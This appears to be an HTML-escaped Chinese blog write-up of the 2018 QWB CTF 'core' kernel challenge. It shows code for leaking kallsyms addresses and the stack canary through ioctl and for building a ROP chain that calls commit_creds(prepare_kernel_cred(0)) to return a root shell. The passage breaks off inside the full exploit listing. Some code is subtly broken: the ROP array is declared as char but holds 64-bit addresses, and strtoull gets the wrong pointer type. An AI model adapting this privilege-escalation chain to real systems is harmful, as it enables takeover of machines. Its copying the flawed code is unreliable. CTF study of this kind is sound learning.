&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;dreamcat@ubuntu:~/Desktop/kernel/&lt;span class=&#34;number&#34;&gt;2018&lt;/span&gt;qwb_core/give_to_player$ checksec vmlinux&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] &lt;span class=&#34;string&#34;&gt;&amp;#x27;/home/dreamcat/Desktop/kernel/2018qwb_core/give_to_player/vmlinux&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Arch:     amd64&lt;span class=&#34;number&#34;&gt;-64&lt;/span&gt;-little&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Version:  &lt;span class=&#34;number&#34;&gt;4.15&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RELRO:    No RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Stack:    Canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    NX:       NX disabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    PIE:      No &lt;span class=&#34;title function_&#34;&gt;PIE&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;number&#34;&gt;0xffffffff81000000&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RWX:      Has RWX segments&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;获取vmlinux_base&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#获取vmlinux_base&#34;&gt;#&lt;/a&gt; 获取 vmlinux_base&lt;/h3&gt;
&lt;p&gt;打开 /tmp/kallsyms，获得 commit_creds 函数与 prepare_kernel_cred 函数地址，并计算出 gadget 的地址。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;GetAddress&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *ptr;									&lt;span class=&#34;comment&#34;&gt;//stroull 的结束符号&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;] = &amp;#123;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; FILE* fd = fopen(&lt;span class=&#34;string&#34;&gt;&amp;quot;/tmp/kallsyms&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;r&amp;quot;&lt;/span&gt;);			&lt;span class=&#34;comment&#34;&gt;//打开文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!fd) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] ERROR.&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(fgets(buf, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(buf), fd)) &amp;#123;			&lt;span class=&#34;comment&#34;&gt;//文件数据会进入缓存，然后再呗拷贝到buf，所以，buf会更新。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (commit_creds &amp;amp;&amp;amp; prepare_kernel_cred)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;[+] Find: commit_creds: 0x%llx\n[+] Find: prepare_kernel_cred: 0x%llx\n&amp;quot;&lt;/span&gt;, commit_creds, prepare_kernel_cred);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;strstr&lt;/span&gt;(buf, &lt;span class=&#34;string&#34;&gt;&amp;quot;commit_creds&amp;quot;&lt;/span&gt;)) &amp;#123;			&lt;span class=&#34;comment&#34;&gt;//string.h库的字符串比较函数，返回字串的位置指针&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   commit_creds = strtoull(buf, ptr, &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;);		&lt;span class=&#34;comment&#34;&gt;//找到了地址，将地址转为unsigned long long &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;strstr&lt;/span&gt;(buf, &lt;span class=&#34;string&#34;&gt;&amp;quot;prepare_kernel_cred&amp;quot;&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   prepare_kernel_cred = strtoull(buf, ptr, &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/*实例&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/ # cat /tmp/kallsyms | grep commit_creds&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;ffffffffba29c8e0 T commit_creds&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/ # &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;#返回用户态的准备，我们最终要返回用户太执行 system (’/bin/sh’)，从你内核太返回的时候，iretq 会恢复某些寄存器的值。所以我们需要提前保存这些值。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;SaveStatus&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; __asm__(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;string&#34;&gt;&amp;quot;mov user_cs, cs;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;string&#34;&gt;&amp;quot;mov user_ss, ss;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;string&#34;&gt;&amp;quot;mov user_sp, rsp;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;string&#34;&gt;&amp;quot;pushf;&amp;quot;&lt;/span&gt;						&lt;span class=&#34;comment&#34;&gt;//所有的16位标志寄存器入栈&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;string&#34;&gt;&amp;quot;pop user_rflags;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里才用汇编内联，将数据保存到全局变量中 user_cs， user_ss, user_sp,&lt;/p&gt;
&lt;p&gt;core.ko 一个外设，但是再 linux 中，万物皆文件，所以只需要访问 /proc/core。&lt;/p&gt;
&lt;p&gt;但是如何实现用户访问与内核的转换的呢？ioctl 函数提供响应的接口。设备对应的是 core_ioctl 函数。&lt;/p&gt;
&lt;p&gt;首先我们要泄露 canary，通过分析，我们得知，buf 与 canary 的偏移量是 0x40，core_read 函数会把 buf 拷贝到我们的 user_buf 中。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ioctl(fd, CORE_OFF, &lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;);			&lt;span class=&#34;comment&#34;&gt;//read canary to buf on kernel stack&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ioctl(fd, &lt;span class=&#34;number&#34;&gt;0x6677889B&lt;/span&gt;, user_buf); &lt;span class=&#34;comment&#34;&gt;//canary in buf.copy it to user_buf that we can control.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;下面我们就要构造 rop, 首先填充 v2 的八字节以及 canary，然后就是布置 gadget。说明一点，commit_creds (prepare_kernel_cred (0)）是在内核态执行的，只有在返回用户态的时候（也就是我们执行完了提权，才需要布置额外的寄存器的数据）&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; rop[&lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;] = &amp;#123;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop[i++] = canary;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop[i++] = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;					&lt;span class=&#34;comment&#34;&gt;//覆盖rbp&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop[i++] = pop_rdi;			&lt;span class=&#34;comment&#34;&gt;//rip &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop[i++] = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;					&lt;span class=&#34;comment&#34;&gt;//rdi=0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop[i++] = prepare_kernel_cred;	&lt;span class=&#34;comment&#34;&gt;//执行prepare_kernel_cred&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop[i++] = pop_rdx;				&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop[i++] = commit_creds;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop[i++] = mov_rdi_rax;			&lt;span class=&#34;comment&#34;&gt;//将prepare_kernel_cred的返回值作为commit_creds的参数。mov_rdi_rax,jmp rdx.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//swapgs --&amp;gt; iretq: rip, cs, rflags, rsp, ss. GetShell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop[i++] = swapgs;					&lt;span class=&#34;comment&#34;&gt;//gadget 是swapgs ;popfq;ret,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop[i++] = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop[i++] = iretq;					&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop[i++] = (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt;)GetShell;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop[i++] = user_cs;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop[i++] = user_rflags;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop[i++] = user_sp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop[i++] = user_ss;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;完整的exp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#完整的exp&#34;&gt;#&lt;/a&gt; 完整的 exp&lt;/h2&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span 